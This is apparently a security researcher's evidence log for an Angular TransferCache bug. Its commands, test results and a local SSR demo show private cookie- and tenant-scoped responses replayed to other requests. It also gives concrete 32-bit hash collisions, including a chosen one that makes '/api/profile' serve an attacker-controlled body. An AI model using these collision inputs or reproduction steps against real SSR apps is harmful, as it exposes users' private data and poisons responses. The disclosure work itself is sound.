# Evidence - Angular TransferCache request-variant confusion

Date: 2026-04-29
Target checkout: `targets/angular`

## Probe

Temporary tests were inserted into `packages/common/http/test/transfer_cache_spec.ts` and then
removed after the run. The persistent probe source is:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/transfer_cache_header_probe.ts
```

## Command

```bash
bazelisk --output_user_root=/tmp/vulnhunter-bazel-user test //packages/common/http/test:test --test_filter='TransferCache withHttpTransferCache should cache a GET carrying Cookie by default and replay it to a same-URL request without Cookie|TransferCache withHttpTransferCache should replay a default GET across non-auth request header variants|TransferCache withHttpTransferCache should replay a cookie-bearing server response during browser hydration'
```

The Bazel/Karma target ran the full `packages/common/http/test:test` suite with the temporary tests
present.

## Result

```text
INFO: Build completed successfully, 5 total actions
//packages/common/http/test:test                                         PASSED in 5.5s

Executing tests from //packages/common/http/test:test
-----------------------------------------------------------------------------
327 specs, 0 failures
Finished in 1.061 seconds
```

## Confirmed expectations

```text
GET /profile with Cookie: sid=alice -> cache stores "alice-private"
GET /profile without Cookie         -> backend not hit; receives "alice-private"

GET /tenant-data with X-Tenant: tenant-a -> cache stores "tenant-a-private"
GET /tenant-data with X-Tenant: tenant-b -> backend not hit; receives "tenant-a-private"

GET /vary-tenant with X-Tenant: tenant-a, response Vary: X-Tenant -> cache stores tenant A
GET /vary-tenant with X-Tenant: tenant-b -> backend not hit; receives tenant A

GET /vary-transferred with transferCache includeHeaders ['Vary'] -> client sees Vary: X-Tenant
GET /vary-transferred with X-Tenant: tenant-b -> backend not hit; receives tenant A

GET /no-store-private, response Cache-Control: private, no-store -> cache stores private body
GET /no-store-private -> backend not hit; receives private body

GET /no-store-transferred with includeHeaders ['Cache-Control'] -> client sees private, no-store
GET /no-store-transferred -> backend not hit; receives private body

GET /collision/4du1y3wwrg responseType text -> cache stores first-colliding-url
GET /collision/xjb04p9--8 responseType text -> backend not hit; receives first-colliding-url

Server-mode GET /profile with Cookie: sid=alice -> TransferState stores "alice-private"
Browser-mode hydrated GET /profile without Cookie -> backend not hit; receives "alice-private"

Chosen collision:
GET /poison?x=yazbadgl responseType text -> stores ATTACKER_CONTROLLED_BODY
GET /api/profile responseType text -> backend not hit; receives ATTACKER_CONTROLLED_BODY
```

## Source explanation

The behavior follows directly from:

- `packages/common/http/src/transfer_cache.ts:126-143`: default cache eligibility excludes
  `Authorization` and `Proxy-Authorization`, but not `Cookie`, `X-Tenant`, `Accept-Language`, or
  credentials mode.
- `packages/common/http/src/transfer_cache.ts:182-188`: cache lookup happens before the backend
  request.
- `packages/common/http/src/transfer_cache.ts:270-282`: response body is stored without checking
  response `Cache-Control`.
- `packages/common/http/src/transfer_cache.ts:322-337`: key fields are method, response type, mapped
  URL, serialized body, and params. Request headers, credentials flags, response `Vary`, and response
  `Cache-Control` are omitted.
- `packages/common/http/src/transfer_cache.ts:337-340`: the complete key is reduced to a 32-bit
  decimal hash before `makeStateKey()`.
- `packages/common/http/src/resource.ts:248-258`: `httpResource` uses the same
  `retrieveStateFromCache()` path for its initial synchronous stream.
- `adev/src/content/guide/ssr.md:428-435`: Angular documents default server-side caching of GET/HEAD
  requests without `Authorization` or `Proxy-Authorization`.

## Cleanup

The temporary test block was removed from `targets/angular/packages/common/http/test/transfer_cache_spec.ts`
after evidence collection. `git -C targets/angular diff -- packages/common/http/test/transfer_cache_spec.ts`
returned no diff.

## Canonical SSR app validation

Fixture:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/server.ts
```

Runtime:

```text
Angular 19.2.21
renderApplication()
provideServerRendering()
provideClientHydration()
provideHttpClient(withFetch(), withInterceptors([cookieForwarder]))
Express SSR server on 127.0.0.1:4218
```

Command:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
curl -sS -H 'Cookie: sid=alice' http://127.0.0.1:4218/
```

Rendered HTML:

```html
<app-root ng-version="19.2.21" ngh="0" ng-server-context="other">
  <main>
    <div id="profile">poison=ATTACKER_CONTROLLED_BODY|profile=ATTACKER_CONTROLLED_BODY</div>
    <div id="hits">tenant:tenant-a|tenant:tenant-a</div>
    <div id="collision">collision:xisvtfhqif|collision:xisvtfhqif</div>
  </main>
</app-root>
<script id="ng-state" type="application/json">
{"1032318893":{"b":"collision:xisvtfhqif","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4218/collision/xisvtfhqif","rt":"text"},"3692728921":{"b":"tenant:tenant-a","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4218/api/hits","rt":"text"},"3782937776":{"b":"ATTACKER_CONTROLLED_BODY","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4218/poison?x=yazbadgl","rt":"text"},"__nghData__":[{}]}
</script>
```

Server log:

```text
[express] render url: http://127.0.0.1:4218/ inbound cookie: "sid=alice"
[api] /poison hit query= {"x":"yazbadgl"}
[ssr] poison body: ATTACKER_CONTROLLED_BODY
[ssr] profile body: ATTACKER_CONTROLLED_BODY
[api] /api/hits hit 1 tenant= "tenant-a"
[ssr] first tenant body: tenant:tenant-a
[ssr] second tenant body: tenant:tenant-a
[api] /collision hit 1 id= "xisvtfhqif"
[ssr] first collision body: collision:xisvtfhqif
[ssr] second collision body: collision:xisvtfhqif
[express] api hit counts profile= 0 tenant= 1 collision= 1
```

This validates the same primitive outside the Angular unit harness:

- the app forwards inbound `Cookie` through a normal `HttpInterceptorFn`;
- a cookie-derived `/api/profile` response is cached into `TransferState` by default;
- `/api/profile` returns `Vary: Cookie`;
- `/api/profile` returns `Cache-Control: private, no-store`;
- `/api/hits` returns `Vary: X-Tenant`;
- `/api/hits` returns `Cache-Control: private, no-store`;
- two sequential same-URL `/api/hits` requests that differ only by `X-Tenant` collapse despite
  `Vary: X-Tenant` and `Cache-Control: private, no-store`;
- the second tenant request does not hit the backend and receives tenant A's response.
- two distinct absolute SSR URLs collide on Angular's 32-bit transfer-cache hash:
  - `GET|text|http://127.0.0.1:4218/collision/xisvtfhqif||`
  - `GET|text|http://127.0.0.1:4218/collision/b3g_cxklta||`
- the second colliding URL does not hit the backend and receives the first URL's response.
- chosen target collision against `/api/profile`:
  - `GET|text|http://127.0.0.1:4218/poison?x=yazbadgl||`
  - `GET|text|http://127.0.0.1:4218/api/profile||`
- `/api/profile` does not hit the backend and receives `ATTACKER_CONTROLLED_BODY`.

## Additional Vary test command

```bash
bazelisk --output_user_root=/tmp/vulnhunter-bazel-user test //packages/common/http/test:test --test_filter='TransferCache withHttpTransferCache should transfer but not honor Vary when includeHeaders contains Vary'
```

Result:

```text
INFO: Build completed successfully, 4 total actions
//packages/common/http/test:test                                         PASSED in 1.7s
Executed 1 out of 1 test: 1 test passes.
```

## Additional 32-bit hash collision command

Temporary Angular-owned test expectation:

```text
GET|text|/collision/4du1y3wwrg|| -> StateKey 2930238366
GET|text|/collision/xjb04p9--8|| -> StateKey 2930238366
```

Command:

```bash
bazelisk --output_user_root=/tmp/vulnhunter-bazel-user test //packages/common/http/test:test --test_filter='TransferCache withHttpTransferCache should replay across distinct URLs with the same 32-bit transfer cache hash'
```

Result:

```text
INFO: Build completed successfully, 4 total actions
//packages/common/http/test:test                                         PASSED in 1.3s
Executed 1 out of 1 test: 1 test passes.
```

Collision finder:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/find_transfer_cache_hash_collision.mjs
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/find_chosen_transfer_cache_collision.mjs
```

## Additional Cache-Control test command

```bash
bazelisk --output_user_root=/tmp/vulnhunter-bazel-user test //packages/common/http/test:test --test_filter='TransferCache withHttpTransferCache should cache a no-store response and replay it from TransferState|TransferCache withHttpTransferCache should transfer but not honor Cache-Control no-store when includeHeaders contains Cache-Control'
```

Result:

```text
INFO: Build completed successfully, 4 total actions
//packages/common/http/test:test                                         PASSED in 1.4s
Executed 1 out of 1 test: 1 test passes.
```
